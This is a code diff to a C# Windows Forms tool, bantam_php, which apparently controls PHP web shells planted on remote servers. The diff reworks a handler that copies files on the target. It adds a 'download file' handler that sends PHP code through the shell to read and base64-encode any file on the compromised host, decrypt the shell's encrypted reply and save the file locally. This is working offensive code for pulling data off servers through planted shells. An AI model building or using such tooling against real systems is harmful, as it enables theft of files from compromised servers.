@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.IO;
 using System.Linq;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -1091,12 +1092,51 @@ namespace bantam_php
 
             string shellUrl = g_SelectedShellUrl;
             string fileName = fileBrowserGetFileName();
-            string newFileName = GuiHelper.RenameFileDialog(fileName, "Copying File");
             bool encryptResponse = Shells[shellUrl].responseEncryption;
 
-            if (newFileName != "") {
+            string newFileName = GuiHelper.RenameFileDialog(fileName, "Copying File");
+
+            if (!string.IsNullOrEmpty(newFileName)) {
                 string phpCode = "@copy('" + fileName + "', '" + txtBoxFileBrowserPath.Text + "/" + newFileName + "');";
                 await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
+            }
+        }
+
+
+        /// <summary>
+        /// 
+        /// </summary>
+        /// <param name="sender"></param>
+        /// <param name="e"></param>
+        private async void downloadFileAsToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            if (validTarget() == false) {
+                return;
+            }
+
+            string shellUrl = g_SelectedShellUrl;
+            string fileName = fileBrowserGetFileName();
+            bool encryptResponse = Shells[shellUrl].responseEncryption;
+            int responseEncryptionMode = Shells[shellUrl].responseEncryptionMode;
+
+            SaveFileDialog downloadFileDialog = new SaveFileDialog {
+                RestoreDirectory = true
+            };
+
+            if (downloadFileDialog.ShowDialog() == DialogResult.OK) {
+                if (!string.IsNullOrEmpty(downloadFileDialog.FileName)) {
+                    string phpCode = "@$result = base64_encode(file_get_contents('" + fileName + "'));";
+                    ResponseObject response = await WebHelper.ExecuteRemotePHP(shellUrl, phpCode, encryptResponse);
+
+                    if (string.IsNullOrEmpty(response.Result) == false) {
+                        string result = response.Result;
+                        if (encryptResponse) {
+                            result = EncryptionHelper.DecryptShellResponse(response.Result, response.EncryptionKey, response.EncryptionIV, responseEncryptionMode);
+                        }
+                        byte[] fileBytes = Helper.DecodeBase64(result);
+                        File.WriteAllBytes(downloadFileDialog.FileName, fileBytes);
+                    }
+                }
             }
         }
 
